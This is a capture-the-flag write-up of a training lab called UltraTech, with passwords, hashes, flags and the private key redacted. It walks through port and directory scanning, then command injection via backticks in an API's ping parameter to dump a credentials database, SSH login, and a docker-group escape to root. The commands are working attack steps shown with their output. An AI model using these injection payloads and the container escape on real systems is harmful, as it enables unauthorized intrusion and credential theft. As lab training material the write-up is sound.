## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
The basics of Penetration Testing, Enumeration, Privilege Escalation and WebApp testing
You have been contracted by UltraTech to pentest their infrastructure.
It is a grey-box kind of assessment, the only information you have
is the company's name and their server's IP address.
```
## IP-Address
```IP-Address
10.49.178.92
```
## RustScan
```bash
PORT      STATE SERVICE REASON         VERSION
21/tcp    open  ftp     syn-ack ttl 62 vsftpd 3.0.5
22/tcp    open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
8081/tcp  open  http    syn-ack ttl 62 Node.js Express framework
31331/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
## Gobuster
```bash
 gobuster dir -u http://10.49.178.92:31331/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

/images               (Status: 301) [Size: 322] [--> http://10.49.178.92:31331/images/]
/css                  (Status: 301) [Size: 319] [--> http://10.49.178.92:31331/css/]
/js                   (Status: 301) [Size: 318] [--> http://10.49.178.92:31331/js/]
/javascript           (Status: 301) [Size: 326] [--> http://10.49.178.92:31331/javascript/]
/server-status        (Status: 403) [Size: 280]
```
- Found `js` & `javascript`
###### JS - Index of /js
- api.js	2019-03-22 18:06	883	 
- app.js	2019-03-22 18:06	43K	 
- app.min.js	2019-03-22 18:06	19K	 
`API.JS` Content
```api.js
(function() {
    console.warn('Debugging ::')
    function getAPIURL() {
	return `${window.location.hostname}:8081`
    }
    function checkAPIStatus() {
	const req = new XMLHttpRequest();
	try {
	    const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
	    req.open('GET', url, true);
	    req.onload = function (e) {
		if (req.readyState === 4) {
		    if (req.status === 200) {
			console.log('The api seems to be running')
		    } else {
			console.error(req.statusText);
		    }
		}
	    };
	    req.onerror = function (e) {
		console.error(xhr.statusText);
	    };
	    req.send(null);
	}
	catch (e) {
	    console.error(e)
	    console.log('API Error');
	}
    }
    checkAPIStatus()
    const interval = setInterval(checkAPIStatus, 10000);
    const form = document.querySelector('form')
    form.action = `http://${getAPIURL()}/auth`;
})();
```
- Got the `ENDPOINT` at`/ping?ip=<IP-Address>/<command>`
- Then testing backticks:
```bash
curl "http://$TARGET:8081/ping?ip=`id`"
```
Returned:
```returned
ping: groups=1002(www): Name or service not known
```
- Try `LFI`
```bash
curl "http://$TARGET:8081/ping?ip=%60ls%60%"
utech.db.sqlite
$ curl "http://10.49.178.92:8081/ping?ip=%60cat%20utech.db.sqlite%60"
���(r00t[hash omitted])admin[hash omitted]
```
- Got Hashes decoded on `Crackstation`
```hashes
|Hash                                |Type     |Result  |
|[hash omitted]    |md5      |[password omitted]|
|[hash omitted]    |md5      |[password omitted]|
```
- Got the  `FTP` & `SSH`
## SSH
```bash
$ ssh r00t@$TARGET
r00t@10.49.178.92's password:[password omitted]
```
## Escalation
```bash
 find / -perm -4000 -type f 2>/dev/null
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/at
/usr/bin/sudo
/usr/bin/gpasswd
/bin/su
/bin/mount
/bin/fusermount
/bin/umount
/snap/core20/2669/usr/bin/chfn
/snap/core20/2669/usr/bin/chsh
/snap/core20/2669/usr/bin/gpasswd
/snap/core20/2669/usr/bin/mount
/snap/core20/2669/usr/bin/newgrp
/snap/core20/2669/usr/bin/passwd
/snap/core20/2669/usr/bin/su
/snap/core20/2669/usr/bin/sudo
/snap/core20/2669/usr/bin/umount
/snap/core20/2669/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2669/usr/lib/openssh/ssh-keysign
/snap/core/17247/bin/mount
/snap/core/17247/bin/ping
```
- More Enumeration
```bash
r00t@ip-10-49-178-92:~$ id
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
r00t@ip-10-49-178-92:~$ groups
r00t docker
r00t@ip-10-49-178-92:~$ docker ps
CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES
```
---
## Docker Root
```bash
$ r00t@ip-10-49-178-92:~$ docker images
REPOSITORY   TAG       IMAGE ID       CREATED       SIZE
bash         latest    495d6437fc1e   6 years ago   15.8MB
r00t@ip-10-49-178-92:~$ docker run -it --rm -v /:/mnt bash chroot /mnt /bin/bash
groups: cannot find name for group ID 11
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
root@98995023f7cf:/#
```
- Got the Root
```bash
root@98995023f7cf:~# ls
private.txt  snap
root@98995023f7cf:~# cat private.txt
# Life and acomplishments of Alvaro Squalo - Tome I
Memoirs of the most successful digital nomdad finblocktech entrepreneur
in the world.
By himself.
## Chapter 1 - How I became successful
root@98995023f7cf:~# ls -la
total 60
drwx------ 10 root root 4096 Oct 26 09:46 .
drwxr-xr-x 23 root root 4096 Feb 12 05:55 ..
-rw-------  1 root root 1136 Oct 26 09:53 .bash_history
-rw-r--r--  1 root root 3303 Oct 26 09:41 .bashrc
drwx------  2 root root 4096 Mar 22  2019 .cache
drwx------  3 root root 4096 Oct 26 09:41 .config
drwx------  3 root root 4096 Mar 22  2019 .emacs.d
drwx------  3 root root 4096 Mar 22  2019 .gnupg
drwxr-xr-x  5 root root 4096 Oct 26 09:42 .npm
drwxr-xr-x  8 root root 4096 Oct 26 09:41 .nvm
-rw-r--r--  1 root root  161 Jan  2  2024 .profile
-rw-------  1 root root    0 Mar 22  2019 .python_history
drwx------  2 root root 4096 Oct 26 09:41 .ssh
-rw-------  1 root root 2212 Oct 26 09:46 .viminfo
-rw-rw-rw-  1 root root  193 Mar 22  2019 private.txt
drwx------  3 root root 4096 Oct 20 18:22 snap
root@98995023f7cf:~# cd .ssh/
root@98995023f7cf:~/.ssh# ls
authorized_keys  id_rsa  id_rsa.pub
root@98995023f7cf:~/.ssh# cat id_rsa

-----BEGIN RSA PRIVATE KEY-----
[private key omitted]
-----END RSA PRIVATE KEY-----
```
- First 9 letter/character are the `Final` Flag
```Flag
[flag omitted]
```
## END
